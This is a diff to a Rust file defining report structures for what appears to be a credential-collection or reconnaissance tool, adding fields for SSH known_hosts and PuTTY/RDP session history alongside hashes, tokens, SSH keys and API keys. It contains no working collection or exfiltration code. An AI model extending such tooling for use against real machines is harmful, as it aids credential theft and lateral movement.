@@ -5,7 +5,7 @@
 use serde::{Deserialize, Serialize};
 use crate::modules::collect::{
     SystemInfo, NetworkInterface, RouteEntry, ArpEntry, NetworkConnection,
-    ProcessInfo, HashEntry, Token, SshKey, ApiKey, SensitiveFile, ConfigFile
+    ProcessInfo, HashEntry, Token, SshKey, ApiKey, KnownHost, RemoteSession, SensitiveFile, ConfigFile
 };
 
 /// 系统报告汇总
@@ -97,6 +97,10 @@ pub struct CredentialReport {
     pub ssh_keys: Vec<SshKey>,
     /// API密钥
     pub api_keys: Vec<ApiKey>,
+    /// SSH known_hosts（连接过的主机）
+    pub known_hosts: Vec<KnownHost>,
+    /// 远程连接历史（PuTTY/RDP）
+    pub remote_sessions: Vec<RemoteSession>,
     /// 统计信息
     pub stats: CredentialStats,
 }
@@ -112,6 +116,10 @@ pub struct CredentialStats {
     pub ssh_key_count: usize,
     /// API密钥数量
     pub api_key_count: usize,
+    /// known_hosts 文件数量
+    pub known_host_count: usize,
+    /// 远程连接历史数量
+    pub remote_session_count: usize,
 }
 
 /// 文件信息报告
@@ -180,11 +188,15 @@ impl Default for CredentialReport {
             tokens: Vec::new(),
             ssh_keys: Vec::new(),
             api_keys: Vec::new(),
+            known_hosts: Vec::new(),
+            remote_sessions: Vec::new(),
             stats: CredentialStats {
                 hash_count: 0,
                 token_count: 0,
                 ssh_key_count: 0,
                 api_key_count: 0,
+                known_host_count: 0,
+                remote_session_count: 0,
             },
         }
     }
@@ -226,6 +238,8 @@ impl CredentialReport {
             token_count: self.tokens.len(),
             ssh_key_count: self.ssh_keys.len(),
             api_key_count: self.api_keys.len(),
+            known_host_count: self.known_hosts.len(),
+            remote_session_count: self.remote_sessions.len(),
         };
     }
 }
